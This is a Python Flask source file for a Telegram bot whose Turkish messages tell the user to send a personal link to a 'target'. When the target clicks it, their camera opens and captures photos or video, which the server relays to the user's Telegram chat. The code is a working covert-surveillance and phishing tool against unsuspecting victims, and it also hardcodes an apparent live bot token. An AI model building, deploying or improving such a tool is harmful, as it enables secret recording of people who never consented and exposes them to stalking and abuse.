import os
import logging
import uuid
import base64
from io import BytesIO
from flask import Flask, request, send_from_directory
import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# ==================== CONFIG ====================
TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")

RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
if RAILWAY_DOMAIN:
    WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
else:
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")

PORT = int(os.environ.get("PORT", 5000))

user_tokens = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder="static")

bot = telegram.Bot(token=TOKEN)

# ==================== ROUTES ====================
@app.route("/" + TOKEN, methods=["POST"])
def telegram_webhook():
    json_data = request.get_json()

    if "message" in json_data and "text" in json_data["message"]:
        chat_id = json_data["message"]["chat"]["id"]
        user_id = json_data["message"]["from"]["id"]
        username = json_data["message"]["from"].get("username", "Bilinmiyor")
        text = json_data["message"]["text"]

        if text == "/start":
            token = str(uuid.uuid4()).replace("-", "")[:16]
            user_tokens[token] = {
                "user_id": user_id,
                "username": username,
                "chat_id": chat_id
            }

            link = WEBHOOK_URL + "/c/" + token

            keyboard = [[InlineKeyboardButton("Linke Git", url=link)]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."

            bot.send_message(
                chat_id=chat_id,
                text=msg,
                reply_markup=reply_markup
            )

    return "OK", 200

@app.route("/c/<token>")
def capture_page(token):
    if token not in user_tokens:
        return "<h1>Link gecersiz!</h1>", 404
    return send_from_directory("static", "capture.html")

@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    data = request.get_json()
    image_data = data.get("image", "")

    if not image_data:
        return {"error": "No image"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except:
        return {"error": "Invalid image"}, 400

    cap = "Yeni Fotograf!\n\nKullanici: @" + username + "\nToken: " + token

    bot.send_photo(
        chat_id=chat_id,
        photo=BytesIO(image_bytes),
        caption=cap
    )

    return {"success": True}, 200

@app.route("/upload_video/<token>", methods=["POST"])
def upload_video(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    video_file = request.files.get("video")
    if not video_file:
        return {"error": "No video"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    cap = "Yeni Video!\n\nKullanici: @" + username

    bot.send_video(
        chat_id=chat_id,
        video=video_file.read(),
        caption=cap
    )

    return {"success": True}, 200

@app.route("/")
def home():
    return "Bot Aktif!"

# ==================== MAIN ====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
